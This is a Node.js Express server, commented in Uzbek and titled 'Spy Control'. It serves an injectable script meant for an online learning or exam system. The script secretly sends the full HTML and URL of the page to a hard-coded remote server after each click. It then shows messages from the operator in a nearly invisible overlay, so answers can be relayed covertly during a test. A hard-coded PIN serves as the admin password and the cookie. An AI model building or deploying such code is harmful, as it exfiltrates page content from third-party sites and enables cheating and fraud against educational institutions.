const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzilingiz
const ADMIN_PASSWORD = "8908"; // Parol
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA ---
let capturedData = { url: "", html: "", date: null };
let chatHistory = ""; 
let lastUpdateID = 0;

// --- AUTH ---
const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) next();
    else res.redirect("/login");
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js) - STEALTH & AUTO MODE
// ========================================================
const clientScript = `
(function(){
  const BASE = '${MY_SERVER_URL}'; 
  let lastSince=0, box=null;

  // 1. OYNA DIZAYNI (Juda kichik va sezilmas)
  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'5px', bottom:'5px', 
      width:'250px',              // Kichkina eni
      maxHeight:'120px',          // Juda past balandlik (ko'zga tashlanmaydi)
      overflowY:'auto',           // SCROLL (faqat ichida aylanadi)
      background:'rgba(0, 0, 0, 0.4)', // 60% shaffof (orqasi ko'rinadi)
      color:'rgba(255, 255, 255, 0.7)', // Oqish-kulrang yozuv
      padding:'8px',
      font:'11px sans-serif',     // Kichkina shrift
      borderRadius:'5px',
      zIndex:2147483647,
      display:'none', 
      whiteSpace:'pre-wrap',      
      wordWrap: 'break-word',
      backdropFilter:'blur(2px)', // Orqani ozgina xiralashtirish
      borderLeft: '2px solid rgba(0, 255, 0, 0.5)' // Faqat chap tomonda ingichka chiziq
    });
    
    // Ingichka Scrollbar (Ko'zga tashlanmasligi uchun)
    const style = document.createElement('style');
    style.innerHTML = \`
      ::-webkit-scrollbar { width: 3px; } 
      ::-webkit-scrollbar-track { background: transparent; }
      ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); borderRadius: 2px; }
    \`;
    document.head.appendChild(style);
    document.body.appendChild(box);
    return box;
  }

  // 2. HTML YUBORISH (AUTO MODE)
  async function sendPage(){
    try{
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML,
            url: window.location.href
        })
      });
      console.log("Spy: Sent"); // Ekranga hech narsa chiqarmaymiz (Toast yo'q)
    }catch(e){}
  }

  // 3. XABAR OLISH
  async function fetchLatest(){
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      if(j.success && j.timestamp > lastSince){
        const b=makeBox();
        // Xabar kelganda oynani ko'rsatamiz
        b.innerHTML = j.message; 
        b.style.display='block';
        b.scrollTop = b.scrollHeight; // Avto pastga tushish
        lastSince = j.timestamp;
      }
    }catch(e){}
  }

  // --- AUTO SPY (LMS UCHUN) ---
  // Har safar sahifada biror narsa bosilganda (masalan "Keyingi" tugmasi)
  // 1.5 soniyadan keyin yangi sahifani yuboradi
  document.addEventListener('click', () => {
      setTimeout(sendPage, 1500); 
  });

  // Sichqoncha 3 marta bosilsa oynani yopish/ochish
  let clickCount = 0;
  document.addEventListener('click', e=>{
    if(e.button===0){
      clickCount++;
      setTimeout(()=>clickCount=0,600);
      if(clickCount>=3){
        clickCount=0;
        if(box) box.style.display=(box.style.display==='none')?'block':'none';
      }
    }
  });

  // Doimiy aloqa
  setInterval(fetchLatest, 3000); // Har 3 soniyada xabar tekshiradi
  sendPage(); // Ishga tushganda birinchi marta yuboradi
})();
`;

// ========================================================
// 🛣 SERVER YO'LLARI
// ========================================================

app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// LOGIN
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`
        <body style="background:#111;color:#555;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif">
        <form action="/login" method="POST">
            <input type="password" name="password" style="background:#222;border:1px solid #333;color:#fff;padding:10px;border-radius:5px;outline:none;text-align:center" placeholder="PIN" autofocus>
        </form>
        </body>
    `);
});

app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
        res.redirect("/");
    } else {
        res.redirect("/login");
    }
});

app.get("/logout", (req, res) => {
    res.clearCookie("admin_token");
    res.redirect("/login");
});

// ADMIN DASHBOARD
app.get("/", checkAuth, (req, res) => {
    const hasData = capturedData.html.length > 0;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Spy Control</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #121212; color: #e0e0e0; font-family: sans-serif; padding: 10px; margin: 0; }
                .container { max-width: 800px; margin: auto; }
                .box { background: #1e1e1e; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; }
                h3 { margin-top: 0; color: #888; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
                
                /* Chat Input */
                .chat-form { display: flex; gap: 10px; }
                input { flex: 1; padding: 10px; background: #2c2c2c; border: 1px solid #444; color: #fff; border-radius: 4px; outline:none; }
                button { padding: 10px 15px; cursor: pointer; border: none; border-radius: 4px; font-weight: bold; }
                .btn-send { background: #007bff; color: white; }
                .btn-clear { background: #dc3545; color: white; width: 100%; margin-top: 10px; opacity: 0.7; font-size: 12px; }

                /* Chat History */
                .history { 
                    background: #000; color: #00ff00; padding: 10px; height: 200px; 
                    overflow-y: auto; border: 1px solid #333; font-family: monospace; font-size: 12px; 
                    white-space: pre-wrap; margin-top: 10px; border-radius: 4px;
                }

                /* HTML Viewer */
                .html-status { font-size: 12px; color: #666; margin-bottom: 10px; }
                .btn-view { background: #28a745; color: white; display: block; text-align: center; text-decoration: none; padding: 10px; border-radius: 4px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
                    <span style="color:#666;font-size:12px">Server: ${MY_SERVER_URL}</span>
                    <a href="/logout" style="color:#666;text-decoration:none;font-size:12px">Chiqish</a>
                </div>

                <!-- CHAT -->
                <div class="box">
                    <h3>💬 Aloqa</h3>
                    <form action="/set-message" method="POST" class="chat-form">
                        <input type="text" name="msg" placeholder="Xabar..." autocomplete="off">
                        <button class="btn-send">Send</button>
                    </form>
                    <div class="history" id="chatbox">${chatHistory || "--- Chat bo'sh ---"}</div>
                    <form action="/clear-history" method="POST">
                        <button class="btn-clear">Tozalash</button>
                    </form>
                </div>

                <!-- HTML -->
                <div class="box">
                    <h3>📥 Sayt / Test</h3>
                    <div class="html-status">
                        URL: <a href="${capturedData.url}" target="_blank" style="color:#007bff">${capturedData.url.substring(0,40)}...</a><br>
                        Vaqt: ${capturedData.date ? new Date(capturedData.date).toLocaleTimeString() : "--:--"}
                    </div>
                    ${hasData ? `<a href="/view-site" target="_blank" class="btn-view">👁 SAYTNI OCHISH (TESTNI KO'RISH)</a>` : '<div style="text-align:center;color:#444">Ma\'lumot kutilmoqda...</div>'}
                </div>
            </div>
            <script>
                // Admin panelda chatni avto pastga tushirish
                const c = document.getElementById('chatbox');
                c.scrollTop = c.scrollHeight;
            </script>
        </body>
        </html>
    `);
});

app.get("/view-site", checkAuth, (req, res) => {
    if (!capturedData.html) return res.send("Ma'lumot yo'q");
    // Rasmlar va stillar ishlashi uchun <base> qo'shamiz
    const fixedHtml = capturedData.html.replace("<head>", `<head><base href="${capturedData.url}">`);
    res.send(fixedHtml);
});

// DATA QABUL QILISH
app.post("/upload-html", (req, res) => {
    capturedData.url = req.body.url || "Noma'lum";
    capturedData.html = req.body.html || "";
    capturedData.date = Date.now();
    res.json({ status: "success" });
});

// XABAR YUBORISH
app.post("/set-message", checkAuth, (req, res) => {
    const msg = req.body.msg;
    if(msg) {
        const time = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
        chatHistory += `[${time}] ${msg}\n`;
        lastUpdateID = Date.now();
    }
    res.redirect("/");
});

app.post("/clear-history", checkAuth, (req, res) => {
    chatHistory = ""; 
    lastUpdateID = Date.now(); 
    res.redirect("/");
});

app.get("/latest", (req, res) => {
    const clientTimestamp = parseInt(req.query.since) || 0;
    if (lastUpdateID > clientTimestamp) {
        res.json({ 
            success: true, 
            message: chatHistory, 
            timestamp: lastUpdateID 
        });
    } else {
        res.json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server ishga tushdi: ${PORT}`));
